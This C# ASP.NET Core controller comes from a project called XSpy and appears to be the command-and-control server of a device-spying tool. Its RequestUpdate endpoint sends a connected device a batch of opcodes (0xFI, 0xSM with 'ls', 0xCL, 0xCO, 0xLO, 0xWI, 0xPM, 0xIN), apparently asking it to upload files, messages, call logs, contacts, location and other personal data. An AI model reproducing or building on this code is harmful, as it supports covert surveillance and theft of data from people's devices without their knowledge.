using System;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.SignalR;
using XSpy.Controllers.Base;
using XSpy.Database.Models.Tables;
using XSpy.Database.Services;
using XSpy.Shared.Models.Requests.Devices;
using XSpy.Shared.Models.Requests.Devices.Search;
using XSpy.Socket;
using XSpy.Utils;

namespace XSpy.Controllers.Api
{
    public class DeviceController : BaseApiController
    {
        private DeviceService _deviceService;
        private IHubContext<MainHub> _hubContext;
        private readonly HubMethods _methods;

        public DeviceController(DeviceService deviceService, IHubContext<MainHub> hubContext, HubMethods hubMethods)
        {
            _methods = hubMethods;
            _hubContext = hubContext;
            _deviceService = deviceService;
        }

        [Route("{deviceId}/update"), PreExecution]
        public async Task<IActionResult> RequestUpdate(Guid deviceId)
        {
            var device = await _deviceService.GetDeviceById(deviceId);
            if (device == null || string.IsNullOrEmpty(device.DeviceId))
                return NotFound();

            var connId = _methods.GetConnectionByDeviceId(device.DeviceId);
            if (string.IsNullOrEmpty(connId))
                return BadRequest();
            
            var client = _hubContext.Clients.Client(connId);
            if (client == null)
                return BadRequest();
            
            await client.SendAsync("0xFI");
            await client.SendAsync("0xSM", "ls", "", "");

            await client.SendAsync("0xCL");
            await client.SendAsync("0xCO");
            await client.SendAsync("0xLO");
            await client.SendAsync("0xWI");
            await client.SendAsync("0xPM");
            await client.SendAsync("0xIN");

            return Ok();
        }

        [Route("list"), PreExecution]
        public async Task<IActionResult> List(DataTableRequest<SearchDeviceRequest> request)
        {
            return Ok(await _deviceService.GetTable(request, LoggedUser));
        }
    }
}